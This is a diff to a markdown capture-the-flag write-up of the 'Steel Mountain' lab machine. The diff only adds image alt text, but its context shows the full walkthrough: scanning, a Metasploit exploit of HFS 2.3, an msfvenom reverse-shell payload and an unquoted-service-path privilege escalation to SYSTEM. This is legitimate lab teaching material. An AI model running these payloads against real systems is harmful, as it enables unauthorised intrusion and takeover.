@@ -46,17 +46,17 @@ nmap -A -p- TARGET --min-rate 10000 -oN steelmountain.nmap -Pn
 | 49163    | rpc         |
 | 49164    | rpc         |
 
-![](https://cdn.ziomsec.com/steelmountain/1.webp)
+![performing an nmap scan on steel mountain machine](https://cdn.ziomsec.com/steelmountain/1.webp)
 
-![](https://cdn.ziomsec.com/steelmountain/2.webp)
+![performing an nmap scan on steel mountain machine](https://cdn.ziomsec.com/steelmountain/2.webp)
 
 ## Initial Foothold
 
 I visited the web applications that were hosted on the target and found an **HTTP File Server** running on port 8080.
 
-![](https://cdn.ziomsec.com/steelmountain/3.webp)
+![accessing the web applciation](https://cdn.ziomsec.com/steelmountain/3.webp)
 
-![](https://cdn.ziomsec.com/steelmountain/4.webp)
+![accessing the file server](https://cdn.ziomsec.com/steelmountain/4.webp)
 
 I then searched for exploits related to this specific version of the File server and found some.
 
@@ -64,7 +64,7 @@ I then searched for exploits related to this specific version of the File server
 searchsploit 'hfs 2.3'
 ```
 
-![](https://cdn.ziomsec.com/steelmountain/5.webp)
+![searching for exploits](https://cdn.ziomsec.com/steelmountain/5.webp)
 
 Since there was a **Metasploit** version of the exploit, I started the **Metasploit** framework and selected the exploit.
 
@@ -87,7 +87,7 @@ run
 > sysinfo
 ```
 
-![](https://cdn.ziomsec.com/steelmountain/6.webp)
+![getting a meterpreter shell](https://cdn.ziomsec.com/steelmountain/6.webp)
 
 I initially gained a 32-bit shell, so I migrated to a 64 bit process to get a 64 bit shell.
 
@@ -97,7 +97,7 @@ migrate PID
 sysinfo
 ```
 
-![](https://cdn.ziomsec.com/steelmountain/7.webp)
+![migrating to a 64 bit process](https://cdn.ziomsec.com/steelmountain/7.webp)
 
 I then captured the user flag from *bill*'s Desktop.
 
@@ -105,7 +105,7 @@ I then captured the user flag from *bill*'s Desktop.
 more C:\Users\bill\Desktop\user.txt
 ```
 
-![](https://cdn.ziomsec.com/steelmountain/8.webp)
+![capturing the user flag](https://cdn.ziomsec.com/steelmountain/8.webp)
 
 ## Privilege Escalation
 
@@ -119,7 +119,7 @@ Invoke-AllChecks
 
 Executing **`Invoke-AllChecks`** revealed an **Unquoted Service Path** misconfiguration on a service running as Local System.
 
-![](https://cdn.ziomsec.com/steelmountain/9.webp)
+![enumerating misconfigurations](https://cdn.ziomsec.com/steelmountain/9.webp)
 
 To exploit the misconfiguration, I first created an **exe** file with the same name as the service directory with a space in its name.
 
@@ -127,11 +127,11 @@ To exploit the misconfiguration, I first created an **exe** file with the same n
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=LISTENER LPORT=5555 -f exe -o Advanced.exe
 ```
 
-![](https://cdn.ziomsec.com/steelmountain/10.webp)
+![developing the exploit payload](https://cdn.ziomsec.com/steelmountain/10.webp)
 
 I then uploaded this application to the parent directory of the directory with the space in its name.
 
-![](https://cdn.ziomsec.com/steelmountain/11.webp)
+![uploading the payload](https://cdn.ziomsec.com/steelmountain/11.webp)
 
 Finally, I restarted the service using **sc**.
 
@@ -139,19 +139,19 @@ Finally, I restarted the service using **sc**.
 sc.exe stop AdvancedSystemCareService9
 ```
 
-![](https://cdn.ziomsec.com/steelmountain/12.webp)
+![restarting the service to execute the payload](https://cdn.ziomsec.com/steelmountain/12.webp)
 
 I started a reverse shell listener on another instance of **metasploit** and got a reverse shell.
 
-![](https://cdn.ziomsec.com/steelmountain/13.webp)
+![starting a reverse shell listener](https://cdn.ziomsec.com/steelmountain/13.webp)
 
 ```shell
 sc.exe start AdvancedSystemCareService9
 ```
 
-![](https://cdn.ziomsec.com/steelmountain/14.webp)
+![restarting the service to execute the payload](https://cdn.ziomsec.com/steelmountain/14.webp)
 
-![](https://cdn.ziomsec.com/steelmountain/15.webp)
+![getting a revers shell](https://cdn.ziomsec.com/steelmountain/15.webp)
 
 Since I had **nt authority** privileges, I captured the root flag from *Administrator*'s Desktop.
 
@@ -159,6 +159,6 @@ Since I had **nt authority** privileges, I captured the root flag from *Administ
 more C:\Users\Administrator\Desktop\root.txt
 ```
 
-![](https://cdn.ziomsec.com/steelmountain/16.webp)
+![capturing the root flag](https://cdn.ziomsec.com/steelmountain/16.webp)
 
 ---
